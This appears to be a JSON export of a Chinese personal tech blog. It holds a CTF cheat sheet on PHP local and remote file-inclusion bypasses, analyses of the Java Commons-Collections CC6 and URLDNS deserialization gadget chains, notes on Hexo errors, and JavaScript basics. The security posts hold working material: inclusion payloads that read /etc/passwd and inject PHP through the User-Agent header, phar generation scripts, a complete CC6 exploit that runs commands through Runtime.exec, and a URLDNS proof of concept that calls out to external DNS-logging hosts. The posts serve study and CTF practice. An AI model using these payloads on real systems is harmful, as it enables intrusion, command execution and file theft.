/etc/httpd/conf/httpd.confindex.php?page=/etc/init.d/httpd\n\nIIS6.0+win2003 配置文件 C:/Windows/system32/inetsrv/metabase.xml\n\nIIS7.0+WIN 配置文件 C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config\n\nsession常见存储路径\nphp的session文件的保存路径可以在phpinfo的session.save_path看到，session文件格式： sess_[phpsessid] ，phpsessid在发送的请求的 cookie 字段中可以看到\n\n/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID\n\n包含系统文件包含 /pros/self/environ\n条件\n\nphp以cgi方式运行，这样environ才会保持UA头。\nenviron文件存储位置已知，且environ文件可读。\n\n\nproc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。\n\n绕过过滤read、resource?f=php://filter/convert.base64-encode/resource=login.php（过滤了操作名read）绕过方式：?f=data:text/plain,&lt;?php phpinfo()?&gt;?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n\n?f=php://filter/read=convert.base64-encode/resource=1.jpg/resource=./show.php（正则 /resource=*.jpg/i）\n\n过滤 ../利用url编码\n\n../\n%2e%2e%2f\n..%2f\n%2e%2e/\n\n\n..\\\n%2e%2e%5c\n..%5c\n%2e%2e\\\n\n\n\n二次编码\n\n../\n%252e%252e%252f\n\n\n..\\\n%252e%252e%255c\n\n\n\n容器/服务器的编码方式\n\n../\n..%c0%af\n%c0%ae%c0%ae/\njava中会把”%c0%ae”解析为”\\uC0AE”，最后转义为ASCCII字符的”.”（点\n\n\n\n\n..\\\n..%c1%9c\n\n\n\n截断包含要求\n\nphp版本小于5.3.4\nmagic_quotes_gpc=off\n\n原理\n\nWindows下目录最大长度为256字节，超出的部分会被丢弃\nLinux下目录最大长度为4096字节，超出的部分会被丢弃。\n\n&lt;?php     include(“includes/” . $_GET[&apos;file&apos;]); ?&gt;\n\n&lt;?php     include(“includes/” . $_GET['file'] . “.htm”); ?&gt;\n\nurl绕过\n?file=http://localhost:8081/phpinfo.php?拼接后：?file=http://localhost:8081/phpinfo.php?.txt\n\n?file=http://localhost:8081/phpinfo.php%23拼接后：?file=http://localhost:8081/phpinfo.php#.txt\n\n%00截断包含\n?p=../hanguo/test.php%00\n\n列目录\n\n条件：magic_quotes_gpc=off\n\n?file=../../../../../../../../../var/www/accounts/%00\n\n路径遍历\n?file=../../../../../../../../../var/lib/locate.db\n\n路径截断\n?file=../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././\n\n点号截断（windows下）\n?file=../../../../../../../../../etc/passwd……………. …\n\n利用phar://协议绕过waf检测\n版本要求：php 5.3.0 起利用php伪协议读取php文件内容\ndata要求：php5.2以后allow_url_fopen ：onallow_url_include：on\n\npoc\ndata:text/plain,&lt;?php phpinfo();?&gt;%00data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n\nphp://filte\n要求：需要开启allow_url_includepocphp://filter/read=convert.base64-encode/resource=upload.php\n\n远程文件包含要求：allow_url_fopen：on\n长度截断利用条件： php版本 &lt; php 5.2.8\n使用截断包含 绕过拼接后缀名00截断%00\n长目录名截断windows下 最大长度为256Linux下最大为4096子节，超出部分会被丢弃\nphar://(php&gt;5.3.0起)phar://支持zip、phar格式的压缩（归档）文件，无视后缀（也就是说jpg后缀照样给你解开来），?file=phar://压缩包路径/压缩包内文件名，绝对路径和相对路径都行。\n利用方法：index.php?file=phar://test.zip/test.txtindex.php?file=phar://test.xxx/test.txt\n制作phar文件（php5.3之后）\n设置php.ini中phar.readonly=off\n\n制作生成脚本\n&lt;?php\t@unlink(&quot;phar.phar&quot;);\t$phar = new Phar(&quot;phar.phar&quot;);\t$phar-&gt;startBuffering();\t$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub\t$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;); //添加要压缩的文件及内容\t$phar-&gt;stopBuffering(); //签名自动计算?&gt;// 这个脚本需要使用php.exe 来生成\n\n生成脚本2\n&lt;?php\t$p = new PharData(dirname(__FILE__).&apos;./test.123&apos;, 0,&apos;test&apos;,Phar::ZIP);\t$p-&gt;addFromString(&apos;test.txt&apos;, &apos;&lt;?php phpinfo();?&gt;&apos;);?&gt;\n\n","categories":["CTF","CTF做题姿势总结"],"tags":["CTF","总结"]},{"title":"Hexo问题记录","url":"/2021/10/01/Hexo%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"Hexo常用命令\nhexo new [layout] &lt;title&gt;  新建一篇文章\nhexo clean    清除缓存文件 (db.json) 和已生成的静态文件 (public)\nhexo generate    生成静态文件\nhexo server  启动服务器\nhexo deploy  部署网站  更多指令\n\n从typora编辑器发布到Hexo需要做那些事情？\n添加头部\n更改名字\n更改时间\n更改标签\n\n\n替换链接\n\nhexo-next 主题 添加评论功能hexo - Next 主题添加评论功能\nHexo-next 主题 配置版权使用Hexo的next主题，配置POST文章文末的版权信息\nHexo 关闭文章评论Hexo 关闭文章评论\nhexo-next设置网站的图标Faviconhexo设置网站的图标Favicon\nHexo-NexT 加载性能优化Hexo-NexT 加载性能优化\nHexo 配置图片懒加载图片懒加载\n貌似看到没有效果\nhexo 部署到 giteeHexo 部署到 Gitee\n报错：Code 401: 未经授权的操作，请检查你的AppId和AppKey.配置域名记得在 Leancloud -&gt; 设置 -&gt; 安全中心 -&gt; Web 安全域名 把你的域名加进去。\n否则网页会出现 “valine 未经授权的操作，请检查你的AppId和AppKey.” 提示。\nhexo g 编译报错错误内容F:\\Blog\\Blog&gt;hexo gINFO  Start processingERROR Process failed: _posts/[0CTF 2016]piapiapia 1.mdYAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 4, column 5:    date: 2021-10-01 22:32:05        ^    at generateError (F:\\Blog\\Blog\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:167:10)    at throwError (F:\\Blog\\Blog\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:173:9)    at readBlockMapping (F:\\Blog\\Blog\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1073:9)    at composeNode (F:\\Blog\\Blog\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1359:12)    at readDocument (F:\\Blog\\Blog\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1519:3)    at loadDocuments (F:\\Blog\\Blog\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1575:5)    at Object.load (F:\\Blog\\Blog\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1596:19)    at parseYAML (F:\\Blog\\Blog\\node_modules\\hexo-front-matter\\lib\\front_matter.js:80:21)    at parse (F:\\Blog\\Blog\\node_modules\\hexo-front-matter\\lib\\front_matter.js:56:12)    at F:\\Blog\\Blog\\node_modules\\hexo\\lib\\plugins\\processor\\post.js:48:20    at tryCatcher (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\util.js:16:23)    at Promise._settlePromiseFromHandler (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise.js:514:35)    at Promise._settlePromise (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise.js:574:18)    at Promise._settlePromise0 (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise.js:619:10)    at Promise._settlePromises (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise.js:699:18)    at Promise._fulfill (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise.js:643:18)    at PromiseArray._resolve (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise_array.js:126:19)    at PromiseArray._promiseFulfilled (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise_array.js:144:14)    at PromiseArray._iterate (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise_array.js:114:31)    at PromiseArray.init [as _init] (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise_array.js:78:10)    at Promise._settlePromise (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise.js:571:21)    at Promise._settlePromise0 (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise.js:619:10)    at Promise._settlePromises (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise.js:699:18)    at Promise._fulfill (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise.js:643:18)    at PromiseArray._resolve (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise_array.js:126:19)    at PromiseArray._promiseFulfilled (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise_array.js:144:14)    at Promise._settlePromise (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise.js:579:26)    at Promise._settlePromise0 (F:\\Blog\\Blog\\node_modules\\bluebird\\js\\release\\promise.js:619:10)INFO  Files loaded in 953 msINFO  0 files generated in 1.77 s\n\n报错原因标题中出现[] \n解决办法使用 大写 【\nhexo d 报错The file will have its original line endings in your working directory[master ec9d510] Site updated: 2021-10-10 21:48:37 2 files changed, 2 insertions(+), 2 deletions(-)ssh: connect to host github.com port 22: Connection refusedfatal: Could not read from remote repository.Please make sure you have the correct access rightsand the repository exists.FATAL Something&apos;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.htmlError: Spawn failed    at ChildProcess.&lt;anonymous&gt; (F:\\Blog\\Blog\\node_modules\\hexo-util\\lib\\spawn.js:52:19)    at ChildProcess.emit (events.js:210:5)    at ChildProcess.cp.emit (F:\\Blog\\Blog\\node_modules\\cross-spawn\\lib\\enoent.js:40:29)    at Process.ChildProcess._handle.onexit (internal/child_process.js:272:12)\n\n测试与github连接ssh -T git@github.com\n$ ssh -T git@github.comssh: connect to host github.com port 22: Connection refused\n\n解决办法网络换成手机热点\n","categories":["Hexo"],"tags":["报错记录"]},{"title":"Java反序列化Common-Collections6利用链分析","url":"/2022/08/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Common-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/","content":"前言上一篇分析了ysoserial中的CC1链，这篇主要分析CC6这条链。\n分析之前，先来看看CC6这条链是如何诞生的呢？\n我们都知道，在CC1这条链中，AnnotationInvocationHandler在执行反序列化时，触发的点是memberValues.entrySet()。\n\n\n\n\n\n\n\n这是在JDK 8u70之前，我们来看看JDK 8u70之后的AnnotationInvocationHandler类，这里用的是JDK 8u301。\n\n\n\n\n\n\n\n可以看到，已经将memberValues.entrySet()换成了其他的，在JDK 8u71更高版本中，就无法继续使用这种方式进行利用了。\n那有没有一条不受JDK版本限制的链条呢？\n答案肯定是有的，也就是即将准备分析的Common-Collections6利用链。\n利用链分析首先，还是先来看看ysoserial的cc6利用链\n\n\n\n\n\n\n\n看起来 还是挺长一串的，但是可以看到，命令执行的方式依旧没变，还是使用了LazyMap的get方法。前面的构造方式已经在《Java反序列化Common-Collections1利用链分析》中说过了，直接对后面的进行分析。\n它使用了TiedMapEntry的getValue来触发LazyMap的get方法。\n\n\n\n\n\n\n\n接下来看看哪里调用了getValue方法\n\n\n\n\n\n\n\n在TiedMapEntry的hashCode方法中调用了getValue方法。\n\n\n\n\n\n\n\n在HashMap的hash方法中找到调用hashCode\n通过查找引用，可以直接在HashMap的readObject方法中找到\n\n\n\n\n\n\n\n但是ysoserial中并不是使用的HashMap，而是使用的HashSet，其实都是一样的，HashSet的readObject方法只不过是间接地调用了hashCode。\n在HashSet的readObject中\n\n\n\n\n\n\n\nput中还是调用了hash\n\n\n\n\n\n\n\n接下来对利用进行梳理，首先\nAnnotationInvocationHandler-&gt;readObject\nAnnotationInvocationHandler-&gt;invoke\nLazyMap-&gt;get\n跟CC1中的一致，原先的AnnotationInvocationHandler类换成了TiedMapEntry的getValue来触发，然后在TiedMapEntry的hashCode调用了getValue，而后HashMap在readObject中直接调用了hash方法，最后hash方法中调用了hashCode方法。\nHashSet在readObject中则是通过map.put方法间接调用了hash方法。\n注意：这里还有一个细节问题，在创建TiedMapEntry对象的时候，我们需要传递一个map和一个key\n\n\n\n\n\n\n\n这里的map就为LazyMap的实例，而key，我们通常会随便传递一个。\n\n\n\n\n\n\n\n如果我们直接执行，是不会弹出计算器的，这是为什么呢？\n打个断点，调试一下就知道了。\n在LazyMap的get\n\n\n\n\n\n\n\nmap.containsKey(key)是用来判断map中是否存在key这个值，如果不存在，会将key存放到map中，如果存在，就不会执行transform。\n为什么会在序列化之前执行到这个方法里面去呢？\n因为需要通过HashSet来触发TiedMapEntry的hashCode，所以我们要将TiedMapEntry通过add方法添加到HashSet中去， 那么在add方法中，也会调用put方法，所以也会间接调用到hash，提前触发命令执行。\n\n\n\n\n\n\n\n那么怎么避免呢？\n其实很简单，只需要在序列化前，用map.remove(key)将HashMap对象中的key移除就好了。\n利用链构造得到一条利用链\nHashSet-&gt;readObjectHashMap-&gt;putHashMap-&gt;hashHashMap-&gt;hashCodeLazyMap-&gt;getChainedTransformer-&gt;transformConstantTransformer-&gt;transformInvokerTransformer-&gt;transform\n\npackage com.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;import java.util.LinkedHashSet;import java.util.Map;public class CC6Test1 &#123;    public static void main(String[] args) throws Exception &#123;        // 因为map.put方法会触发hash操作，会提前触发有害payload，所以先构造一个无害payload放入        Transformer[] transformers = new Transformer[]&#123;new ConstantTransformer(1)&#125;;        // 反序列化真正执行的payload        Transformer[] fucktransformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                // 调用Runtime 的 getMethod方法 通过getMethod方法 找到 getRuntime 方法                new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[0]&#125;),                // 调用 getRuntime 返回 Runtime 对象                new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                // 调用 Runtime 对象的 exec 方法 执行命令                new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc.exe\"&#125;)        &#125;;        // 将Transformer数组串联起来        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(1);        // 通过HashMap.get方法触发transform        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        Map map1 = LazyMap.decorate(map, chainedTransformer);        TiedMapEntry tiedMapEntry = new TiedMapEntry(map1, 11);        HashSet&lt;Object&gt; hashSet = new HashSet&lt;&gt;();        hashSet.add(tiedMapEntry);        // 绕过 map.containsKey(key)        map.remove(11);        setFieldValue(chainedTransformer, \"iTransformers\", fucktransformers);        byte[] serialize = Serialize(hashSet);        UnSerialize(serialize);    &#125;    // 通过反射设置类属性    public static void setFieldValue(Object obj1, String s1, Object obj2) throws Exception&#123;        Class clazz = obj1.getClass();        Field field = clazz.getDeclaredField(s1);        field.setAccessible(true);        field.set(obj1, obj2);    &#125;    public static byte[] Serialize(Object obj) throws Exception&#123;        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(obj);        return baos.toByteArray();    &#125;    public static void UnSerialize(byte[] bytes) throws Exception&#123;        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);        ObjectInputStream ois = new ObjectInputStream(bais);        ois.readObject();    &#125;&#125;\n\n文章逻辑可能写得有点混乱，希望大佬们多多指教。\n","categories":["Java安全"],"tags":["java安全漫谈","java反序列化"]},{"title":"Java反序列化URLDNS利用链分析","url":"/2022/08/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/","content":"前言URLDNS这条链子的功能就是触发一次DNS请求，因为对第三方库没有依赖和对JDK没有要求，适合用来检测是否存在反序列化漏洞。\n利用链分析通过ysoserial这个工具可以看到URLDNS这条链的payload。\n\n\n\n\n\n\n\n比较简短，可以看到，传入的参数是url，返回的是HashMap的实例对象ht，那我们来具体分析一下，这条链到底做了什么。\n对一个对象进行反序列化会调用这个对象的readObject方法，首先看看HashMap对象的readObject方法。\nprivate void readObject(java.io.ObjectInputStream s)        throws IOException, ClassNotFoundException &#123;        // Read in the threshold (ignored), loadfactor, and any hidden stuff        s.defaultReadObject();        reinitialize();        if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))            throw new InvalidObjectException(\"Illegal load factor: \" +                                             loadFactor);        s.readInt();                // Read and ignore number of buckets        int mappings = s.readInt(); // Read number of mappings (size)        if (mappings &lt; 0)            throw new InvalidObjectException(\"Illegal mappings count: \" +                                             mappings);        else if (mappings &gt; 0) &#123; // (if zero, use defaults)            // Size the table using given load factor only if within            // range of 0.25...4.0            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);            float fc = (float)mappings / lf + 1.0f;            int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?                       DEFAULT_INITIAL_CAPACITY :                       (fc &gt;= MAXIMUM_CAPACITY) ?                       MAXIMUM_CAPACITY :                       tableSizeFor((int)fc));            float ft = (float)cap * lf;            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?                         (int)ft : Integer.MAX_VALUE);            // Check Map.Entry[].class since it's the nearest public type to            // what we're actually creating.            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);            @SuppressWarnings(&#123;\"rawtypes\",\"unchecked\"&#125;)            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];            table = tab;            // Read the keys and values, and put the mappings in the HashMap            for (int i = 0; i &lt; mappings; i++) &#123;                @SuppressWarnings(\"unchecked\")                    K key = (K) s.readObject();                @SuppressWarnings(\"unchecked\")                    V value = (V) s.readObject();                putVal(hash(key), key, value, false, false);            &#125;        &#125;    &#125;\n\n\n\n\n\n\n\n\n最后一条语句对key执行hash方法，接下来跟进hash。\n\n\n\n\n\n\n\n在hash方法中，会调用key的hashCode方法，也就是说，通过创建一个HashMap对象，对该对象的key传入其他任意对象，再对HashMap实例进行序列化，再将其进行反序列化时，就会触发执行任意对象hashCode方法。\n那么HashMap对象的key传入什么对象才会触发一次DNS请求操作呢？ysoserial传入的是一个URL对象。\n\n\n\n\n\n\n\n接下来，我们看看URL的hashCode方法。\n\n\n\n\n\n\n\n该方法也会调用handler的hashCode方法，并将当前对象传入，handler为URLStreamHandler的实例对象。\n进行URLStreamHandler看看hashCode方法。\n\n\n\n\n\n\n\n可以看到方法中调用了getHostAddress，传入的产生为一个URL对象，跟进getHostAddress。\n\n\n\n\n\n\n\n调用用了URL的getHostAddress方法，跟进。\n\n\n\n\n\n\n\n这里我们就看罪魁祸首了，InetAddress.getByName的作用就是根据主机名获取ip地址，会进行一次DNS查询。\n\n\n\n\n\n\n\n那么至此，我们得到一个利用链\nHashMap-&gt;readObjectHashMap-&gt;hashURL-&gt;hashCodeURLStreamHandler-&gt;hashCodeURLStreamHandler-&gt;getHostAddressURL-&gt;getHostAddress    -&gt; InetAddress.getByName(host)\n\n接下来，通过上面的利用链，自己来构造一条。\npackage com.URLDNS;import java.io.*;import java.net.URL;import java.net.URLConnection;import java.net.URLStreamHandler;import java.util.HashMap;public class DNSURL2 &#123;    public static void main(String[] args) throws Exception&#123;        // 构建URLStreamHandler        URLStreamHandler h = new URLStreamHandler() &#123;            @Override            protected URLConnection openConnection(URL u) throws IOException &#123;                return null;            &#125;        &#125;;        // 请求url        String url = \"http://t60w9vifj3wnsvsu9drcigusijo9cy.burpcollaborator.net\";        URL u = new URL(null, url, h);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        map.put(u, 123);        // 序列化        FileOutputStream fos = new FileOutputStream(\"ser.bin\");        ObjectOutputStream oos = new ObjectOutputStream(fos);        oos.writeObject(map);        // 反序列化//        FileInputStream fis = new FileInputStream(\"ser.bin\");//        ObjectInputStream ois = new ObjectInputStream(fis);//        ois.readObject();    &#125;&#125;\n\n这里将反序列化注释后，依旧会触发一次dns请求，原因是我们将URL对象放进HashMap也就是执行put操作的时候，也会执行一次hash方法，多多少少还是有点瑕疵。\n\n\n\n\n\n\n\n规避在序列化就执行dns请求的方法也很简单，在URL类的hashCode方法中。\n\n\n\n\n\n\n\n我们只需要在执行put前将URL对象的hashCode通过反射改成除了-1之外的其他数，然后再在序列化前将hashCode改回-1,就能规避掉这个瑕疵。\npackage com.URLDNS;import java.io.*;import java.lang.reflect.Field;import java.net.URL;import java.net.URLConnection;import java.net.URLStreamHandler;import java.util.HashMap;public class DNSURL2 &#123;    public static void main(String[] args) throws Exception&#123;        // 构建URLStreamHandler        URLStreamHandler h = new URLStreamHandler() &#123;            @Override            protected URLConnection openConnection(URL u) throws IOException &#123;                return null;            &#125;        &#125;;        // 请求url        String url = \"http://j04kqf.dnslog.cn\";        URL u = new URL(null, url, h);        // 防止在执行put时触发dns查询        setFieldValue(u, \"hashCode\", 111);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        map.put(u, 123);        // 改回来        setFieldValue(u, \"hashCode\", -1);        // 序列化        FileOutputStream fos = new FileOutputStream(\"ser.bin\");        ObjectOutputStream oos = new ObjectOutputStream(fos);        oos.writeObject(map);        // 反序列化        FileInputStream fis = new FileInputStream(\"ser.bin\");        ObjectInputStream ois = new ObjectInputStream(fis);        ois.readObject();    &#125;    public static void setFieldValue(Object o, String f, int v) throws Exception&#123;        Class c = o.getClass();        Field field = c.getDeclaredField(f);        field.setAccessible(true);        field.set(o, v);    &#125;&#125;\n\n\n\n\n\n\n\n\n这样就解决了URLDNS这条链子触发两次的情况。\nysoserial解决两次触发的方式但是在ysoserial中，并不算这样做的。\n\n\n\n\n\n\n\n他写了一个继承继承了URLStreamHandler的SilentURLStreadHandler类，重写了getHostAddress方法。\n\n\n\n\n\n\n\n可以看到，直接返回了null，为什么这样也可以呢。我们只需要看看URL中传入的handler参数修饰符就知道了。\n\n\n\n\n\n\n\ntransient修饰符的作用是将这个属性就不会序列化到指定的目的地中。也就是说，HashMap在执行put方法的时候，调用的方法不是URLStreamHandler中的getHostAddress方法，而是自己构造继承至URLStreamHandler的SilentURLStreamHandler中重新的getHostAddress，因为返回null，所有在序列化前并不会触发dns请求。而这个方法也并不会序列化进对象，所以在反序列化的时候调用的为URLStreamHandler中的getHostAddress，才执行了dns请求。\n参考文章木头师傅\nhttps://www.yuque.com/tianxiadamutou/zcfd4v/fewu54#f3b2a19f  \nJava安全漫谈 - 08.反序列列化篇(2)\n","categories":["Java安全"],"tags":["java安全漫谈","java反序列化"]},{"title":"Javascript基础笔记","url":"/2020/08/31/Javascript%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/","content":"javascript\n高级、解释型语言 \n支持面向对象、命令式、函数式编程\n开发商：Netscape(网景)\n最初发行时间：1995\n\n基础介绍    js输出语句        控制浏览器弹出一个警告框        alert(“内容”)\n    让计算机在页面中输出一个内容\n    document.write(&quot;内容&quot;)) 向body中输出一个内容\n\n    向控制台输出一个内容\n    console.log(&quot;内容&quot;)\n\n\njs外部引入方式\n&lt;script type=&quot;text/javascript&quot; src=&quot;js/script.js&quot;&gt;&lt;/script&gt;\n\n注意事项\n    script标签一旦用于引入外部文件，就不能在标签内编写代码\n    如果需要在标签内编写则需要重新创建一个script来编写\n\nUnicode编码使用\n在js中使用Unicode编码\n    \\u四位编码\n        - console.log(&quot;\\u2620&quot;)\n\n在html页面中使用Unicode编码\n    &amp;#编码; 这里得编码需要得是十进制\n        - &lt;h1&gt;&amp;#9760;&lt;/h1&gt;基本语法\njs注释\n    单行注释 //\n    多行注释 /* */\n\njs注意事项\n    1. js中严格区分大小写\n    2. js中每一条语句以分号(;)结尾\n        - 如果不写分号，浏览器会自动添加，但会影响性能\n    3. js中会忽略多个空格和换行\n\n声明变量\n    var a = 100; \n\n标识符\n    - js中所有可以自主命名的都是标识符\n    - 例如：变量名、函数名、属性名\n    - 命名一个标识符需要遵守的规则\n        1. 标识符中可以含有字母、数字、_、$\n        2. 标识符不能以数字开头\n        3. 标识符不能是ES中的关键字或保留字\n        4. 标识符一般都采用驼峰命名法\n            - 首字母小写，每个单词的开头字母大写，其余字母小写\n    - js底层保存标识符实际上是采用Unicode编码\n    - 所以理论上讲，所有的utf-8中含有的内容都可以作为标识符\n\n数据类型(6种)\n\n    typeof 检查变量的类型\n    语法: typeof 变量\n\n    String 字符串\n        - &apos;&apos;\n        - &quot;&quot;\n\n        转义字符(\\)\n            \\   转义字符\n            \\n  表示换行\n            \\t  制表符\n            \\\\  表示\\\n\n    Number 数值\n        - 包括整数和浮点数(小数)\n\n        js中表示数字的最大值\n            Number.MAX_VALUE\n\n        js中表示数字的最小值\n            Number.MIN_VALUE\n\n        Number表示的数字超过了最大值显示：\n            Infinity 表示正无穷\n            -Infinity 表示负无穷\n            用typeof 检查 类型为 Number\n\n        注意事项：\n            1. NaN 是一个特殊的数字\n            2. 如果使用js进行浮点运算，可能得到一个不精确的结果\n\n    Boolean 布尔值\n        - true\n        - false\n\n    Null 空值\n        - 表示一个为空的对象\n        - 使用typeof 检查 会返回 object\n\n    Undefined 未定义\n        - 当声明一个变量，但未赋值，值就为undefined\n\n    Object 对象\n        - Object属于引用数据类型\n\n强制类型转换\n    - 指将一个数据类型强制转换为其他的数据类型\n    - 类型转换主要指，将其他的数据类型，转换为\n        String NumBer Boolean\n\n    将其他数据类型转换为String\n        方式一：\n            - 调用被转换数据类型的toString()方法\n            - 该方法不会影响到原变量，它会将转换的结果返回\n            - 注意：null和undefined这两个值没有toString()方法\n                如果条用他们的方法，会报错\n\n        方式二：\n            - 调用String()函数，并将被转换的数据作为参数传递给函数\n            - 使用String()函数做强制类型转换时，\n                对于Number和Boolean实际上就是调用toString()方法\n                但是对于null和undefined,就不会调用toString()方法\n                    它会将null 直接转换为 &quot;null&quot;\n                    将undefined 直接转换为 &quot;undefined&quot;\n\n    将其他的数据类型转换为Number\n        方式一：\n            使用Number() 函数\n                - 字符串转数字\n                    1. 如果是纯数字的字符串，则直接将其转换为数字\n                    2. 如果字符串中有非数字的内容，则转换为NaN\n                    3. 如果字符串是一个空串或者是一个全是空格的字符串，则转换为0\n\n                - 布尔转数字\n                    true 转成 1\n                    false 转成 0\n\n                - null 转 数字  0\n\n                - undefined 转 数字 NaN\n\n        方式二：\n            - 这种方式专门用来针对字符串\n            - parseInt() 把一个字符串转换为一个整数\n            - parseFloat() 把一个字符串转换成一个浮点数\n\n    将其他数据类型转换为Boolean\n        - 使用Boolean()函数\n            - 数字 转 布尔\n                除了0 和 NaN，其余的都是true\n\n            - 字符串 转 布尔\n                除了空串，其余的都是true\n\n            - null 和 undefined 都会转换为false\n\n            - 对象也会转换为true\n\n运算符\n    算术运算符\n        当对非Number类型的值进行运算时，会将这些值转换为Number然后再运算\n        任何值和NaN做运算都得NaN\n        +   -   *   /   %\n\n    一元运算符\n        +   -\n\n    自增自减运算符\n        ++  --\n\n    逻辑运算符\n        !   &amp;&amp;  ||\n\n        &amp;&amp; || 非布尔值的情况\n            - 对于非布尔值进行与或运算时，\n                会先将其转换为布尔值，然后再运算，并且返回原值\n\n            - 与运算：\n                - 